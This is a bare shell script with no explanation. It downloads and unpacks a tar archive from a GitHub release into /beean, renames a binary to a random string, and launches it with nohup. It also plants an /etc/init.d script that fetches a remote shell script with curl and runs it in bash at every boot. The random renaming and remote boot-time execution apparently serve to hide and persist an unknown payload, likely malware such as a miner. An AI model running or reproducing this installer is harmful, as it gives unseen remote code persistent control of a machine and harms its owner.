cd /
wget https://github.com/jeletti/hancow/releases/download/v3.0.0/beean.tar
tar -xvf beean.tar
cd /beean
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv angkla $variable1
sed -i "s/oodo/${variable1} -n=${variable1}/g" ./costa.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/jeletti/hancow/main/smeletry.sh)" > hoursed.sh
chmod a+x hoursed.sh
update-rc.d hoursed.sh defaults
rm -rf beean.tar
cd /beean
nohup ./costa.sh
ps -ef | grep beean
cd /
rm -rf beean.tar
echo "Done"
